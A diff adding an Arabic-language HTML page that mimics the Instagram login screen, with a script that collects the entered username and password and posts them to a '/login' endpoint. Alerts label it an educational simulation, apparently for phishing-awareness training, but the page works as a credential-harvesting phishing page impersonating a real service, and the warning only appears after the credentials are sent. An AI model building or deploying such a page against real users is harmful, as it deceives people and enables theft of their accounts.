@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    body {
+      background: #fafafa;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      width: 350px;
+      padding: 40px 40px 20px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 48px;
+      margin-bottom: 20px;
+      color: #262626;
+    }
+
+    input {
+      width: 100%;
+      margin: 6px 0;
+      padding: 9px 8px;
+      font-size: 14px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      outline: none;
+      background: #fff;
+      border-color: #a8a8a8;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 12px;
+      padding: 8px;
+      background-color: #3897f0;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    button:hover {
+      background-color: #2a76d9;
+    }
+
+    .divider {
+      margin: 15px 0;
+      display: flex;
+      align-items: center;
+      color: #999;
+      font-weight: 600;
+      font-size: 13px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+      margin: 0 12px;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+
+    .facebook-login svg {
+      margin-left: 8px;
+    }
+
+    .forgot {
+      color: #00376b;
+      font-size: 12px;
+      margin-top: 12px;
+      cursor: pointer;
+      text-decoration: none;
+      display: block;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #999;
+    }
+
+    @font-face {
+      font-family: 'Billabong';
+      src: url('https://cdn.jsdelivr.net/gh/tholman/billabong/font/Billabong.ttf') format('truetype');
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Instagram</div>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required />
+      <input type="password" id="password" placeholder="كلمة المرور" required />
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+
+    <div class="divider">أو</div>
+
+    <a href="#" class="facebook-login" onclick="alert('محاكاة تعليمية فقط')">
+      <svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="facebook-square" class="svg-inline--fa fa-facebook-square fa-w-14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="20" height="20" fill="#385185">
+        <path d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h137.25V327.69h-53.13v-64.31h53.13v-47.28c0-52.56 32.14-81.17 79.01-81.17 22.56 0 41.98 1.68 47.65 2.44v55.3h-32.75c-25.67 0-30.63 12.21-30.63 30.13v39.58h61.27l-7.98 64.31h-53.29V480H400c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48z"></path>
+      </svg>
+      تسجيل الدخول باستخدام فيسبوك
+    </a>
+
+    <a href="#" class="forgot" onclick="alert('محاكاة تعليمية فقط')">هل نسيت كلمة المرور؟</a>
+
+    <div class="footer">
+      © 2025 Instagram from Meta
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      try {
+        const response = await fetch('/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+
+        if (!response.ok) {
+          const errorText = await response.text();
+          throw new Error(errorText || 'خطأ غير معروف');
+        }
+
+        const data = await response.json();
+        alert('🚨 تنبيه: هذه محاكاة تعليمية فقط.\n' + data.message);
+      } catch (err) {
+        alert('حدث خطأ أثناء الإرسال: ' + err.message);
+      }
+    });
+  </script>
+</body>
+</html>
